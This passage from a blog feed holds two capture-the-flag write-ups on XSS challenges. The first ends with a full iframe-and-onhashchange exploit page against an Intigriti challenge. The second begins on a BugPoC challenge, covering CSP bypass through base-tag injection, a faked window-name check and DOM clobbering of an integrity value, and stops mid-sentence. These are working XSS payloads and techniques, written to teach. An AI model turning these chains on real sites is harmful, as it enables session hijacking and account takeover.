+the same restrictions?</p>
+
+<p>Something strange can be noticed in the <code class="language-plaintext highlighter-rouge">getQueryVariable</code> function: the search
+query string that is extracted from the URL is stored in a global variable,
+<code class="language-plaintext highlighter-rouge">searchQueryString</code>, for no reason; a local variable could be used instead:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">getQueryVariable</span><span class="p">(</span><span class="nx">variable</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">searchQueryString</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">?</span><span class="dl">"</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>As a result, if we used this URL:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://challenge-1220.intigriti.io/?javascript:alert(document.domain)//&amp;num1=location&amp;operator=%3d&amp;num2=searchQueryString
+</code></pre></div></div>
+
+<p>Then we would essentially make the page execute the following javascript:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">searchQueryString</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">javascript:alert(document.domain)//&amp;num1=location&amp;operator=%3d&amp;num2=searchQueryString</span><span class="dl">"</span><span class="p">;</span>
+<span class="nb">eval</span><span class="p">(</span><span class="dl">"</span><span class="s2">location=searchQueryString</span><span class="dl">"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>This payload only uses allowed characters in <code class="language-plaintext highlighter-rouge">num1</code>, <code class="language-plaintext highlighter-rouge">operator</code> and <code class="language-plaintext highlighter-rouge">num2</code>, yet
+it executes an expression that can contain any banned character, like <code class="language-plaintext highlighter-rouge">:</code>, <code class="language-plaintext highlighter-rouge">(</code>
+and <code class="language-plaintext highlighter-rouge">)</code>. Unfortunately the <code class="language-plaintext highlighter-rouge">location=searchQueryString</code> string is 26 characters
+long, which exceeds the 20 char limit. We’re not quite done yet.</p>
+
+<h3 id="be-my-puppet">Be my puppet</h3>
+
+<p>Here comes the fun part. Early on I had the feeling that the only way to get to
+the solution would be to call the <code class="language-plaintext highlighter-rouge">calc</code> function multiple times with different
+payloads, since there didn’t seem to be a way to do what we want with just one
+<code class="language-plaintext highlighter-rouge">eval</code>, given the restrictions in place.</p>
+
+<p>For the longest time I thought the key was to use the first <code class="language-plaintext highlighter-rouge">calc()</code> invocation
+to set one of the window’s event handler. We could either:</p>
+
+<ul>
+  <li>
+    <p>Set it to <code class="language-plaintext highlighter-rouge">init</code> to get another go at <code class="language-plaintext highlighter-rouge">calc()</code> and its coveted <code class="language-plaintext highlighter-rouge">eval</code>. The
+problem is that without a way of changing the URL’s query parameters between
+rounds, it would just endlessly execute the same thing over and over again
+every time the event pops.</p>
+  </li>
+  <li>
+    <p>Or, set it to one of the button’s event handler, which do modify the query
+parameters before calling <code class="language-plaintext highlighter-rouge">init</code> again. However it doesn’t give us enough
+control over the way the query parameters are modified.</p>
+  </li>
+</ul>
+
+<p>So I was stuck, hopelessly and endlessly trying things that deep down I knew
+would never work.</p>
+
+<p>And then, it struck me. onhashchange.</p>
+
+<p>When the hash portion of a URL is changed, the <code class="language-plaintext highlighter-rouge">hashchange</code> even is generated
+but the page is not actually reloaded, since everything after the <code class="language-plaintext highlighter-rouge">#</code> is purely
+client-side. Luckily, <code class="language-plaintext highlighter-rouge">getQueryVariable()</code> doesn’t care about hash signs, so we
+can put our entire query string behind a <code class="language-plaintext highlighter-rouge">#</code>. Our initial payload will install
+the <code class="language-plaintext highlighter-rouge">init</code> function as the window’s <code class="language-plaintext highlighter-rouge">onhashchange</code> event handler. Then if we
+changed our payload in the hash portion of the URL, we would get another round
+of execution with our new payload. Still in the same context, since there is no
+reload.</p>
+
+<p>Fortunately the web page doesn’t have any framing protection. We can just
+iframe it, and from our own page change the hash portion of the iframe’s URL to
+make it execute a payload of our choice. Each payload has to satisfy the sanity
+checks in place, but we can chain as many as we want until we get the desired
+result.  The iframe is our puppet and we’re its master, making it execute a new
+line of our malicious script with each hash change.</p>
+
+<p>Here is the sequence of URLs we will use and, for each one, the piece of
+javascript that we intend the iframe to execute:</p>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">https://challenge-1220.intigriti.io/#?num1=onhashchange&amp;operator=%3d&amp;num2=init</code>
+    <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">eval</span><span class="p">(</span><span class="dl">"</span><span class="s2">onhashchange=init</span><span class="dl">"</span><span class="p">);</span>
+</code></pre></div>    </div>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">https://challenge-1220.intigriti.io/#?javascript:alert(document.domain)//&amp;num1=x&amp;operator=%3d&amp;num2=searchQueryString</code>
+    <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">searchQueryString</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">javascript:alert(document.domain)//&amp;num1=x&amp;operator=%3d&amp;num2=searchQueryString</span><span class="dl">"</span><span class="p">;</span>
+<span class="nb">eval</span><span class="p">(</span><span class="dl">"</span><span class="s2">x=searchQueryString</span><span class="dl">"</span><span class="p">);</span>
+</code></pre></div>    </div>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">https://challenge-1220.intigriti.io/#?num1=location&amp;operator=%3d&amp;num2=x</code>
+    <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">eval</span><span class="p">(</span><span class="dl">"</span><span class="s2">location=x</span><span class="dl">"</span><span class="p">);</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h2 id="full-poc">Full PoC</h2>
+
+<p>Here is our malicious page:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="kd">function</span> <span class="nx">setHash</span><span class="p">(</span><span class="nx">hash</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">frame</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">frame</span><span class="p">.</span><span class="nx">src</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">#</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">#</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">hash</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">pilot</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">hashes</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="dl">"</span><span class="s2">?javascript:alert(document.domain)//&amp;num1=x&amp;operator=%3d&amp;num2=searchQueryString</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">?num1=location&amp;operator=%3d&amp;num2=x</span><span class="dl">"</span><span class="p">,</span>
+    <span class="p">];</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">hashes</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Chrome seems to do fine without it, but Firefox requires a small</span>
+        <span class="c1">// delay after the hash has been set, to let the iframe run its</span>
+        <span class="c1">// onhashchange handler</span>
+        <span class="nx">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="nx">setHash</span><span class="p">(</span><span class="nx">hashes</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span> <span class="p">},</span> <span class="nx">i</span><span class="o">*</span><span class="mi">100</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"frame"</span> <span class="na">hidden</span> <span class="na">onload=</span><span class="s">"pilot()"</span>
+        <span class="na">src=</span><span class="s">"https://challenge-1220.intigriti.io/#?num1=onhashchange&amp;operator=%3d&amp;num2=init"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/iframe&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>I have a <a href="https://acut3.xyz/intigriti-1220-ao56hrx42jg8/poc.html">PoC</a> online
+if you want to give it a try.</p>
+
+<p>Here are a few things to note:</p>
+
+<ul>
+  <li>
+    <p>The hash changes are done in <code class="language-plaintext highlighter-rouge">pilot()</code>, which is called as the iframe’s
+<code class="language-plaintext highlighter-rouge">onload</code> handler. This is to ensure we don’t change the hash before the
+initial page has been loaded completely.</p>
+  </li>
+  <li>
+    <p>The hash is changed by changing the iframe’s <code class="language-plaintext highlighter-rouge">src</code> attribute, and not it’s
+<code class="language-plaintext highlighter-rouge">location</code>. Changing <code class="language-plaintext highlighter-rouge">frame.location</code> doesn’t seem to fire the <code class="language-plaintext highlighter-rouge">onhashchange</code>
+handler inside the iframe. If you know the reason for that, please let me know.</p>
+  </li>
+  <li>
+    <p>The first hash change is done without any delay since we know the iframe is
+loaded completely. The second hash change is scheduled after a 100ms delay to
+make sure the iframe’s <code class="language-plaintext highlighter-rouge">onhashchange</code> handler has had time to do its job. This
+is required on Firefox, which is is understandable, but for some reason Chrome
+can execute the exploit reliably even without this delay. Not sure why.</p>
+  </li>
+</ul>
+
+<h2 id="final-thoughts">Final thoughts</h2>
+
+<p>A great challenge that showcases a beautiful way of escalating an otherwise
+weak DOM XSS. This technique was new to me and required quite a few hours of
+intense head scratching. Which of course made finding the solution even more
+satisfying!</p>
+
+<hr />]]></content><author><name>acut3</name></author><category term="ctf" /><category term="ctf" /><category term="xss" /><category term="iframe" /><category term="onhashchange" /><summary type="html"><![CDATA[Using hashchange events to control a vulnerable page and escalate an otherwise mostly harmless DOM XSS]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/intigriti-december-xss-challenge/cover.png" /><media:content medium="image" url="http://localhost:4000/assets/intigriti-december-xss-challenge/cover.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">BugPoC Wacky XSS Challenge</title><link href="http://localhost:4000/ctf/2020/11/10/bugpoc-wacky-xss-challenge.html" rel="alternate" type="text/html" title="BugPoC Wacky XSS Challenge" /><published>2020-11-10T00:00:00+01:00</published><updated>2020-11-10T00:00:00+01:00</updated><id>http://localhost:4000/ctf/2020/11/10/bugpoc-wacky-xss-challenge</id><content type="html" xml:base="http://localhost:4000/ctf/2020/11/10/bugpoc-wacky-xss-challenge.html"><![CDATA[<p><em>Bypassing CSP and SRI with HTML injection and DOM Clobbering</em></p>
+
+<!--more-->
+
+<p><img src="/assets/bugpoc-wacky-xss-challenge/wacky.buggywebsite.com_alert.png" alt="Alert" /></p>
+
+<h2 id="tldr">TL;DR</h2>
+
+<p>The attack uses a few tricks that are pretty neat. For those of you who already
+have a good understanding of the challenge, here are some key points:</p>
+
+<ul>
+  <li>
+    <p>The attack works by using the <code class="language-plaintext highlighter-rouge">param</code> query parameter on
+<code class="language-plaintext highlighter-rouge">https://wacky.buggywebsite.com/frame.html</code> to inject a <code class="language-plaintext highlighter-rouge">&lt;base&gt;</code> tag between
+the <code class="language-plaintext highlighter-rouge">&lt;title&gt;</code>tags. By doing so we’re making the sandboxed iframe load the
+<code class="language-plaintext highlighter-rouge">files/analytics/js/frame-analytics.js</code> file from our own server. It allows us
+to bypass the CSP’s nonce check and get an XSS inside the sandboxed iframe.</p>
+  </li>
+  <li>
+    <p>The block on modal windows inside the sandboxed iframe is bypassed by using
+our XSS inside the sandboxed iframe, to inject an XSS inside its parent. This
+is allowed because <code class="language-plaintext highlighter-rouge">allow-same-origin</code> is used in the sandboxed iframe, making
+it share its parent’s origin.</p>
+  </li>
+  <li>
+    <p>Since we can’t iframe <code class="language-plaintext highlighter-rouge">https://wacky.buggywebsite.com/frame.html</code>, we’re
+opening it as a new window in an <code class="language-plaintext highlighter-rouge">onclick()</code> handler on our malicious page.
+The (improper) check that makes sure the page is iframed is bypassed by setting
+the name of the new window to <code class="language-plaintext highlighter-rouge">iframe</code></p>
+  </li>
+  <li>
+    <p>The <code class="language-plaintext highlighter-rouge">integrity</code> check on the <code class="language-plaintext highlighter-rouge">files/analytics/js/frame-analytics.js</code> script
+is bypassed using DOM clobbering. Our injected payload includes an <code class="language-plaintext highlighter-rouge">&lt;input
+name="fileIntegrity" value="..."&gt;</code> tag that sets <code class="language-plaintext highlighter-rouge">fileIntegrity.value</code> to the
+sha256 of our own malicious javascript.</p>
+  </li>
+  <li>
+    <p>The BugPoC PoC uses the the HTTP Front-end PoC. It also uses the Mock
+Endpoint to return the malicious <code class="language-plaintext highlighter-rouge">frame-analytics.js</code>, and the Flexible
+Redirector to hide the mock endpoint’s URL behind a tidy, path-free,
+<code class="language-plaintext highlighter-rouge">&lt;base&gt;</code>-friendly URL</p>
+  </li>
+</ul>
+
+<h2 id="recon">Recon</h2>
+
+<p>The goal is to find an XSS on the web page below and pop an <code class="language-plaintext highlighter-rouge">alert(origin)</code>
+that will show <code class="language-plaintext highlighter-rouge">https://wacky.buggywebsite.com/</code>:</p>
+
+<p><img src="/assets/bugpoc-wacky-xss-challenge/wacky.buggywebsite.com.png" alt="Wacky Text Generator" /></p>
+
+<p>The web page is pretty simple: you enter a text, click the “Make Whacky!”
+button, and the text is rendered using different fonts and shades of green for
+each letter.</p>
+
+<p>Right away we can notice that some sanitizing it done on the text area: when a
+key is lifted the <code class="language-plaintext highlighter-rouge">&amp;*&lt;&gt;%</code> characters are removed. This is done by the following
+piece of code:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">txt</span><span class="dl">"</span><span class="p">).</span><span class="nx">onkeyup</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">[</span><span class="sr">&amp;*&lt;&gt;%</span><span class="se">]</span><span class="sr">/g</span><span class="p">,</span> <span class="dl">''</span><span class="p">);</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>The wacky text is in fact rendered in a different iframe whose <code class="language-plaintext highlighter-rouge">src</code> is updated
+when the “Make Whacky!” button is pressed:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">btn</span><span class="dl">'</span><span class="p">).</span><span class="nx">onclick</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+    <span class="nx">val</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">txt</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">theIframe</span><span class="dl">'</span><span class="p">).</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">/frame.html?param=</span><span class="dl">'</span><span class="o">+</span><span class="nx">val</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>We can see that the text to render is passed to the iframe through the <code class="language-plaintext highlighter-rouge">param</code>
+query parameter, and it gets reflected in exactly two different locations
+inside the iframe:</p>
+
+<ol>
+  <li>Between the <code class="language-plaintext highlighter-rouge">&lt;title&gt;</code> tags:
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nt">&lt;title&gt;</span>
+     qwerty
+ <span class="nt">&lt;/title&gt;</span>    
+</code></pre></div>    </div>
+  </li>
+  <li>Inside a <code class="language-plaintext highlighter-rouge">&lt;p&gt;</code> section:
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nt">&lt;div</span> <span class="na">role=</span><span class="s">"main"</span><span class="nt">&gt;</span>
+     <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"text"</span> <span class="na">data-action=</span><span class="s">"randomizr"</span><span class="nt">&gt;</span>qwerty<span class="nt">&lt;/p&gt;</span>
+ <span class="nt">&lt;/div&gt;</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p>The text inside this <code class="language-plaintext highlighter-rouge">&lt;p&gt;</code> section is then rendered inside the iframe by the
+following piece of code:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">makeRandom</span><span class="p">(</span><span class="nx">element</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span> <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">element</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">createNewText</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
+        <span class="kd">var</span> <span class="nx">htmlColorTag</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">color:</span><span class="dl">'</span><span class="p">;</span>
+        <span class="k">for</span> <span class="p">(</span> <span class="kd">var</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">element</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">textContent</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">j</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">riFonts</span> <span class="o">=</span> <span class="nx">randomInteger</span><span class="p">(</span><span class="nx">fonts</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+            <span class="kd">var</span> <span class="nx">riColors</span> <span class="o">=</span> <span class="nx">randomInteger</span><span class="p">(</span><span class="nx">colors</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+            <span class="nx">createNewText</span> <span class="o">=</span> <span class="nx">createNewText</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;span class='</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">fonts</span><span class="p">[</span><span class="nx">riFonts</span><span class="p">]</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">' style='</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">htmlColorTag</span> <span class="o">+</span> <span class="nx">colors</span><span class="p">[</span><span class="nx">riColors</span><span class="p">]</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">'&gt;</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">element</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">textContent</span><span class="p">[</span><span class="nx">j</span><span class="p">]</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;/span&gt;</span><span class="dl">"</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nx">element</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">createNewText</span><span class="p">;</span>
+    <span class="p">}</span>			  
+<span class="p">}</span>
+<span class="kd">var</span> <span class="nx">text</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="dl">'</span><span class="s1">text</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">makeRandom</span><span class="p">(</span><span class="nx">text</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>The top document and the iframe are both returned with an <code class="language-plaintext highlighter-rouge">x-frame-options:
+SAMEORIGIN</code> header, meaning we wouldn’t be able to iframe either or these
+inside our own page. This is important because it would have been a way to call
+the iframe with a <code class="language-plaintext highlighter-rouge">param</code> of our choice.</p>
+
+<p>Last but not least, both the top document and the iframe use the following CSP:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>content-security-policy: script-src 'nonce-xxxxxxxxxxxx' 'strict-dynamic'
+</code></pre></div></div>
+
+<p>Since the nonce changes randomly with every request (as it should), it
+basically means our only way to execute a payload is to insert it inside an
+existing <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag.</p>
+
+<h2 id="the-path-to-alert">The Path to alert()</h2>
+
+<h3 id="making-an-educated-guess">Making an educated guess</h3>
+
+<p>The only query parameter we’ve found is <code class="language-plaintext highlighter-rouge">param</code> in the iframe’s URL. Searching
+through the response bodies shows no use of <code class="language-plaintext highlighter-rouge">location</code>, which mean it doesn’t
+seem there is any extraction of parameters from the URL on the client side. If
+there is an XSS, it is almost certainly inside the iframe, through the <code class="language-plaintext highlighter-rouge">param</code>
+query parameter.</p>
+
+<p>This is pretty much confirmed by this piece of code inside the iframe:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">g</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">alert</span><span class="p">;</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">alert</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">g</span><span class="p">(</span><span class="nx">b</span><span class="p">),</span>
+    <span class="nx">g</span><span class="p">(</span><span class="nx">atob</span><span class="p">(</span><span class="dl">"</span><span class="s2">TmljZSBKb2Igd2l0aCB0aGlzIENURiEgSWYgeW91IGVuam95ZWQgaGFja2luZyB0aGlzIHdlYnNpdGUgdGhlbiB5b3Ugd291bGQgbG92ZSBiZWluZyBhbiBBbWF6b24gU2VjdXJpdHkgRW5naW5lZXIhIEFtYXpvbiB3YXMga2luZCBlbm91Z2ggdG8gc3BvbnNvciBCdWdQb0Mgc28gd2UgY291bGQgbWFrZSB0aGlzIGNoYWxsZW5nZS4gUGxlYXNlIGNoZWNrIG91dCB0aGVpciBqb2Igb3BlbmluZ3Mh</span><span class="dl">"</span><span class="p">))</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>It redefines the <code class="language-plaintext highlighter-rouge">alert()</code> function to pop the alert as expected, and then pop
+a second alert with the following message:</p>
+
+<blockquote>
+  <p>Nice Job with this CTF! If you enjoyed hacking this website then you would
+love being an Amazon Security Engineer! Amazon was kind enough to sponsor
+BugPoC so we could make this challenge. Please check out their job openings!</p>
+</blockquote>
+
+<p>So, the XSS will happen inside the <code class="language-plaintext highlighter-rouge">https://wacky.buggywebsite.com/frame.html</code>
+iframe for sure, and probably through the <code class="language-plaintext highlighter-rouge">param</code> query parameter.</p>
+
+<h3 id="controlling-the-iframe">Controlling the iframe</h3>
+
+<p>We’ve seen that we can’t iframe <code class="language-plaintext highlighter-rouge">https://wacky.buggywebsite.com/frame.html</code>
+inside our own page, because of the <code class="language-plaintext highlighter-rouge">x-frame-options: SAMEORIGIN</code> header. But
+then how could we get our victim to open it with our payload in the <code class="language-plaintext highlighter-rouge">param</code>
+query parameter?</p>
+
+<p>Simple, let’s just call <code class="language-plaintext highlighter-rouge">window.open()</code> instead, and open the frame in a new
+tab.</p>
+
+<p>Well it doesn’t work, because of this piece of code:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// verify we are in an iframe</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">name</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
+    <span class="p">[...]</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">`
+    &lt;h1&gt;Error&lt;/h1&gt;
+    &lt;h2&gt;This page can only be viewed from an iframe.&lt;/h2&gt;
+    &lt;video width="400" controls&gt;
+    &lt;source src="movie.mp4" type="video/mp4"&gt;
+    &lt;/video&gt;`</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Fortunately for us this is not a proper way to check if we’re in an iframe. We
+can just fake it by setting the name of the new window to “iframe”. Our
+malicious page would look like:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="kd">function</span> <span class="nx">popup</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span>
+        <span class="dl">'</span><span class="s1">My payload</span><span class="dl">'</span>
+    <span class="p">);</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://wacky.buggywebsite.com/frame.html?param=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">payload</span><span class="p">,</span>
+                <span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span> <span class="c1">// Sets name to "iframe" in the new window</span>
+<span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#"</span> <span class="na">onclick=</span><span class="s">"popup()"</span><span class="nt">&gt;</span>Click me!<span class="nt">&lt;/a&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>We make sure to call <code class="language-plaintext highlighter-rouge">window.open()</code> in an <code class="language-plaintext highlighter-rouge">onclick()</code> handler, because if the
+popup doesn’t result from a click then it would be blocked by default.</p>
+
+<h3 id="csp-bypass">CSP Bypass</h3>
+
+<p>Out of the two injection points we’ve found, only the first one, between the
+<code class="language-plaintext highlighter-rouge">&lt;title&gt;</code> tags, is not escaped. Normally we could just close the <code class="language-plaintext highlighter-rouge">&lt;title&gt;</code> tag
+and inject our script there. However, because the CSP requires a nonce that we
+don’t know, the execution is blocked as we can see in the console:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">popup</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span>
+        <span class="dl">'</span><span class="s1">&lt;/title&gt;&lt;script&gt;alert(origin)&lt;/script&gt;</span><span class="dl">'</span>
+    <span class="p">);</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://wacky.buggywebsite.com/frame.html?param=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">payload</span><span class="p">,</span>
+                <span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p><img src="/assets/bugpoc-wacky-xss-challenge/wacky.buggywebsite.com_CSP.png" alt="CSP" /></p>
+
+<p>Lucky for us, the <code class="language-plaintext highlighter-rouge">https://wacky.buggywebsite.com/frame.html</code> page also creates
+a sandboxed iframe. This iframe loads a script from a relative location:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">script</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">script</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">script</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">src</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">files/analytics/js/frame-analytics.js</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">[...]</span>
+<span class="nx">analyticsFrame</span><span class="p">.</span><span class="nx">contentDocument</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Instead of injecting a <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> we can inject a <code class="language-plaintext highlighter-rouge">&lt;base
